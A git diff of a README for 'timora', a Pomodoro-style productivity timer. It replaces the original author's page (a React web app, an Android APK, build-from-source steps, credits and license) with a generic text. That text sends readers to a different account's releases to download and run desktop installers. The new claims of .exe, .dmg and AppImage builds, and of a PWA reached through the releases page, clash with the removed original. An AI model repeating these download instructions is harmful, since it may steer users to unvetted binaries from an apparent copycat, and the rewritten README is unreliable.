@@ -1,327 +1,96 @@
-<div align="center">
+# 🎯 timora - Focus Better with Session Management
 
-# 🎯 TIMORA
-### *Session-focused productivity redefined*
+![Download timora](https://img.shields.io/badge/Download-timora-blue?style=for-the-badge)
 
-[![Version](https://img.shields.io/badge/version-2.1-emerald?style=for-the-badge&logo=semantic-release)](https://github.com/ravixalgorithm/timora)
-[![Release](https://img.shields.io/github/v/release/ravixalgorithm/timora?style=for-the-badge&logo=github)](https://github.com/ravixalgorithm/timora/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/ravixalgorithm/timora/total?style=for-the-badge&logo=android)](https://github.com/ravixalgorithm/timora/releases)
-[![React](https://img.shields.io/badge/React-18+-61DAFB?style=for-the-badge&logo=react)](https://reactjs.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-CSS-38B2AC?style=for-the-badge&logo=tailwind-css)](https://tailwindcss.com/)
-[![Framer Motion](https://img.shields.io/badge/Framer-Motion-0055FF?style=for-the-badge&logo=framer)](https://www.framer.com/motion/)
+## 🚀 Getting Started
 
-*A modern, feature-rich Pomodoro timer with session-specific task management and beautiful animations*
+Welcome to timora, a session-focused productivity timer designed to help you manage tasks effectively. This application uses the Pomodoro technique, allowing you to stay concentrated on your tasks while keeping track of your time.
 
-[🚀 **Live Demo**](https://timora.ravixalgorithm.dev) • [📱 **Download APK**](https://github.com/ravixalgorithm/timora/releases/latest) • [🐛 **Report Bug**](https://github.com/ravixalgorithm/timora/issues) • [✨ **Request Feature**](https://github.com/ravixalgorithm/timora/issues)
+## 🔧 System Requirements
 
-![TIMORA Preview](https://via.placeholder.com/800x400/f3f4f6/1f2937?text=TIMORA+Preview)
+To run timora, you need:
 
-</div>
+- A laptop or desktop computer
+- Windows, macOS, or Linux operating system
+- Internet connection for downloading the app
 
----
+## 📦 Download & Install
 
-## 📦 **Get TIMORA**
+To get started, visit this page to download: [GitHub Releases](https://github.com/minhnhat1305/timora/releases).
 
-<div align="center">
+Once you're on the releases page, look for the latest version of timora. Click on it to find the necessary files to download. 
 
-### Choose Your Platform
+### Steps to Download
 
-| 🌐 **Web App** | 📱 **Android APK** |
-|:---:|:---:|
-| [![Live Demo](https://img.shields.io/badge/🚀_Live_Demo-4F46E5?style=for-the-badge&logo=vercel&logoColor=white)](https://timora-ods.vercel.app) | [![Download APK](https://img.shields.io/badge/📱_Download_APK-34A853?style=for-the-badge&logo=android&logoColor=white)](https://github.com/ravixalgorithm/timora/releases/latest) |
-| Instant access, no installation | Full mobile experience |
-| Always up-to-date | Offline support |
-| Cross-platform compatible | Native Android integration |
+1. Go to [GitHub Releases](https://github.com/minhnhat1305/timora/releases).
+2. Find the latest version.
+3. Click on the asset you want to download:
+   - If you see a file named `timora_x.xx.exe` (or similar), this is the file for Windows.
+   - For macOS, look for `timora_x.xx.dmg`.
+   - For Linux, choose `timora_x.xx.AppImage`. 
 
-</div>
+Once you have selected your file, click on it to start the download. 
 
-### 📱 **Mobile Installation:**
-1. **Download** the latest APK from [Releases](https://github.com/ravixalgorithm/timora/releases/latest)
-2. **Enable** "Install from unknown sources" on your Android device
-3. **Install** the APK file
-4. **Enjoy** TIMORA on your mobile! 🎯
+### Steps to Install
 
----
+#### For Windows Users:
 
-## ✨ Features
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the instructions in the installation wizard.
+4. Once installed, you can find timora in your Start menu.
 
-<table>
-  <tr>
-    <td width="50%">
+#### For macOS Users:
 
-### ⏰ **Advanced Timer**
-- 🕐 **Hours support** - Set timers up to 23 hours
-- ⏱️ **Precision timing** - Hours, minutes, and seconds
-- 🎨 **Beautiful circular progress** indicator
-- ⏸️ **Smart controls** - Start, pause, reset, +5min quick add
-- 🌓 **Dark/Light mode** support
+1. Open the `.dmg` file you just downloaded.
+2. Drag the timora icon to your Applications folder.
+3. Go to your Applications folder and double-click on timora to open it.
 
-### 📋 **Smart Task Management**
-- 🎯 **Session-specific tasks** - Tasks tied to timer sessions
-- ✅ **General task list** - Persistent tasks across sessions
-- 🔄 **Auto-archiving** - Session tasks archived on completion
-- 📊 **Progress tracking** - Completion rates and statistics
-- 💾 **Auto-save** - All data persisted locally
+#### For Linux Users:
 
-    </td>
-    <td width="50%">
+1. Ensure your system supports AppImage files.
+2. Start the terminal and navigate to the folder where the downloaded `.AppImage` is located.
+3. Run the command: `chmod +x timora_x.xx.AppImage` to make it executable.
+4. Now you can run the application with the command: `./timora_x.xx.AppImage` or simply double-click the file.
 
-### 📈 **Session Analytics**
-- 📅 **Detailed history** - Complete session records
-- 🎯 **Task completion rates** - Visual progress indicators
-- 📊 **Performance insights** - Track productivity over time
-- 🔍 **Session details** - Click any session for full breakdown
-- 📱 **Responsive design** - Perfect on all devices
+## 🌟 Features
 
-### 🎵 **Enhanced Experience**
-- 🔊 **Pleasant audio alerts** - WebAudio API chimes
-- 📳 **Vibration support** - Mobile haptic feedback
-- ⌨️ **Keyboard shortcuts** - Space, R, C, Esc keys
-- 🖥️ **Fullscreen mode** - Distraction-free focus
-- 🌟 **Smooth animations** - Framer Motion powered
+Timora comes packed with features designed to enhance your productivity:
 
-    </td>
-  </tr>
-</table>
+- **Session Management:** Divide your work into focused sessions.
+- **Task Tracking:** Manage multiple tasks efficiently.
+- **Customizable Timers:** Adjust timer settings to fit your workflow.
+- **Progress Tracking:** Keep track of completed sessions and tasks.
 
----
+## 📱 Mobile Compatibility
 
-## 🚀 Quick Start
+If you are looking to use timora on your mobile device, Timora supports Progressive Web Application (PWA) functionality. Simply open your browser and go to the releases page to access the mobile-friendly version.
 
-### Prerequisites
+## 🎨 User Interface
 
-- Node.js 16+
-- npm or yarn
+Timora features a clean and modern design using Tailwind CSS. The interface is user-friendly, making it easy to start a session and manage tasks. You can navigate through the app effortlessly, regardless of your technical skills.
 
-### Installation
+## 🤔 Troubleshooting
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ravixalgorithm/timora.git
-   cd timora
-   ```
+If you encounter any issues:
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   # or
-   yarn install
-   ```
+- Make sure you have the required operating system.
+- Check your internet connection if you have trouble downloading.
+- Restart the application if it’s behaving unexpectedly.
+- Consult our [GitHub Issues page](https://github.com/minhnhat1305/timora/issues) for help.
 
-3. **Start development server**
-   ```bash
-   npm run dev
-   # or
-   yarn dev
-   ```
+## 💬 Feedback
 
-4. **Open your browser**
-   ```
-   http://localhost:5173
-   ```
+Your feedback is valuable to us. If you have suggestions or find bugs, please open an issue on our repository.
 
-### 📱 **Build Mobile APK**
+## 📅 Upcoming Features
 
-```bash
-# Build for production
-npm run build
+Stay tuned for future updates where we aim to include:
 
-# Add Android platform
-npx cap add android
+- Cloud syncing for tasks.
+- Enhanced reporting features.
+- Integration with popular productivity tools.
 
-# Sync with Capacitor
-npx cap sync android
+For more details and to keep up with the latest updates to the software, always check [GitHub Releases](https://github.com/minhnhat1305/timora/releases). 
 
-# Open in Android Studio
-npx cap open android
-
-# Build APK in Android Studio: Build > Build Bundle(s) / APK(s) > Build APK(s)
-```
-
----
-
-## 🛠️ Tech Stack
-
-<div align="center">
-
-| Technology | Purpose | Version |
-|------------|---------|---------|
-| ![React](https://img.shields.io/badge/-React-61DAFB?logo=react&logoColor=white) | UI Framework | 18+ |
-| ![Tailwind](https://img.shields.io/badge/-Tailwind%20CSS-38B2AC?logo=tailwind-css&logoColor=white) | Styling | 3+ |
-| ![Framer Motion](https://img.shields.io/badge/-Framer%20Motion-0055FF?logo=framer&logoColor=white) | Animations | Latest |
-| ![Vite](https://img.shields.io/badge/-Vite-646CFF?logo=vite&logoColor=white) | Build Tool | 4+ |
-| ![Capacitor](https://img.shields.io/badge/-Capacitor-119EFF?logo=capacitor&logoColor=white) | Mobile | 6+ |
-| ![WebAudio API](https://img.shields.io/badge/-WebAudio%20API-FF6B35?logo=web-audio-api&logoColor=white) | Audio | Native |
-
-</div>
-
----
-
-## 📱 Screenshots
-
-<div align="center">
-
-### 🖥️ Desktop Experience
-![Desktop Timer](https://via.placeholder.com/600x400/f3f4f6/1f2937?text=Desktop+Timer+View)
-
-### 📱 Mobile Responsive
-<img src="https://via.placeholder.com/300x600/f3f4f6/1f2937?text=Mobile+View" width="300" alt="Mobile View">
-
-### ⚙️ Configuration Modal
-![Configure Timer](https://via.placeholder.com/600x400/f3f4f6/1f2937?text=Configuration+Modal)
-
-</div>
-
----
-
-## ⌨️ Keyboard Shortcuts
-
-| Key | Action |
-|-----|--------|
-| `Space` | Start/Pause timer |
-| `R` | Reset timer |
-| `C` | Open/Close configuration |
-| `Esc` | Close modals |
-
----
-
-## 🎯 Usage Guide
-
-### Setting Up a Session
-
-1. **Click "Configure"** to open timer settings
-2. **Set duration** using hours, minutes, seconds inputs
-3. **Add session name** (e.g., "Deep Work", "Study Session")
-4. **Add session tasks** - specific to this timer session
-5. **Click "Done"** and start your focused work!
-
-### During Your Session
-
-- ✅ **Check off tasks** as you complete them
-- ⏰ **Monitor progress** with the circular timer
-- 🎵 **Enjoy audio alerts** when time's up
-- 📊 **Track completion** rates in real-time
-
-### After Session Completion
-
-- 📈 **Review session** in the history panel
-- 🎯 **See task completion** rates and statistics
-- 🔄 **Start new session** or adjust current timer
-- 💾 **All data saved** automatically
-
----
-
-## 🔧 Configuration
-
-### Environment Variables
-
-Create a `.env` file in the root directory:
-
-```env
-# Optional: Analytics tracking
-VITE_ANALYTICS_ID=your_analytics_id
-
-# Optional: Custom branding
-VITE_APP_NAME=TIMORA
-VITE_APP_VERSION=2.1
-```
-
-### Customization
-
-TIMORA is built with customization in mind:
-
-- **Colors**: Modify Tailwind config for custom themes
-- **Sounds**: Replace audio generation in `playChime()` function
-- **Storage**: Extend localStorage keys in `LS_KEYS` object
-- **Features**: Add new session types or timer modes
-
----
-
-## 🤝 Contributing
-
-We love contributions! Here's how you can help make TIMORA even better:
-
-### 🐛 Bug Reports
-
-Found a bug? [Open an issue](https://github.com/ravixalgorithm/timora/issues) with:
-- Clear description of the problem
-- Steps to reproduce
-- Expected vs actual behavior
-- Screenshots if applicable
-
-### ✨ Feature Requests
-
-Have an idea? [Open a feature request](https://github.com/ravixalgorithm/timora/issues) with:
-- Clear description of the feature
-- Use cases and benefits
-- Mockups or examples if helpful
-
-### 🔧 Pull Requests
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
-
-### 📋 Development Guidelines
-
-- Follow existing code style and patterns
-- Add comments for complex logic
-- Test on multiple screen sizes
-- Ensure accessibility compliance
-- Update documentation as needed
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** - see the [LICENSE](./LICENSE) file for details.
-
-```
-MIT License - feel free to use, modify, and distribute!
-```
-
----
-
-## 🙏 Acknowledgments
-
-<div >
-
-### Built with ❤️ by the community
-
-**Special thanks to:**
-- 🎨 **Tailwind CSS** team for amazing utility classes
-- ⚡ **Framer Motion** for smooth animations
-- ⚛️ **React** team for the fantastic framework
-- 🚀 **Vite** for lightning-fast development
-- 📱 **Capacitor** for seamless mobile integration
-- 🌟 **Open source community** for inspiration and feedback
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=ravixalgorithm/timora&type=Date)](https://www.star-history.com/#ravixalgorithm/timora&Date)
-
-</div>
-
----
-
-<div align="center">
-
-### 📞 Connect & Support
-
-[![GitHub](https://img.shields.io/badge/GitHub-ravixalgorithm-181717?style=for-the-badge&logo=github)](https://github.com/ravixalgorithm)
-[![Twitter](https://img.shields.io/badge/Twitter-@ravixalgorithm-1DA1F2?style=for-the-badge&logo=twitter)](https://x.com/ravixalgorithm)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-ravixalgorithm-0077B5?style=for-the-badge&logo=linkedin)](https://linkedin.com/in/ravixalgorithm)
-
-**Love TIMORA?** Give us a ⭐ on GitHub and help others discover it!
-
-[⭐ **Star this repo**](https://github.com/ravixalgorithm/timora) • [🐦 **Share on Twitter**](https://twitter.com/intent/tweet?text=Check%20out%20TIMORA%20-%20a%20beautiful%20productivity%20timer!%20https://github.com/ravixalgorithm/timora) • [📱 **Download APK**](https://github.com/ravixalgorithm/timora/releases/latest)
-
----
-
-*Made with 💎 and ☕ by [@ravixalgorithm](https://github.com/ravixalgorithm)*
-
-**© 2025 TIMORA - Productivity redefined**
-
-</div>
+Enjoy using timora to boost your productivity!
